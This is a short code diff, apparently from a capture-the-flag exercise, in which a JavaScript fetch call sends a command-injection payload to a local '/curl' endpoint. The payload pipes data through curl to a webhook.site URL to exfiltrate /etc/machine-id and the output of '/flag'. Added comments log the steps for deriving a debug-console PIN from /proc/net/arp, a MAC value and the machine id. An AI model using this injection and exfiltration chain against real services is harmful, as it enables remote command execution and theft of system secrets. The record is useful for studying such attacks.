@@ -13,7 +13,7 @@
         const res = await fetch("http://localhost:8001/curl", {
             method: "POST",
             headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: "cmd=file:///etc/machine-id | curl -X POST --data-binary @- https://webhook.site/97912302-411f-4587-b7b9-055611f6df06/q= | curl -X POST --data-binary @/proc/self/fd/0 https://webhook.site/97912302-411f-4587-b7b9-055611f6df06/p=`/flag`"
+            body: "cmd=localhost:8001/console | curl -X POST --data-binary @- https://webhook.site/97912302-411f-4587-b7b9-055611f6df06/q= | curl -X POST --data-binary @/proc/self/fd/0 https://webhook.site/97912302-411f-4587-b7b9-055611f6df06/p=`/flag`"
 
             //STEP 1 /proc/net/arp
 
@@ -27,7 +27,13 @@
 
             //187999308480769
 
-            //STEP 3 
+            //STEP 3 /etc/machine-id
+
+            //a9d6384a4da44fb9b80f8a1f00c4a453
+
+            //By running the exploit script we get pin as 428-075-344
+
+            //Step 4 notice the secret which can be used as s
 
         });
         const data = await res.text();
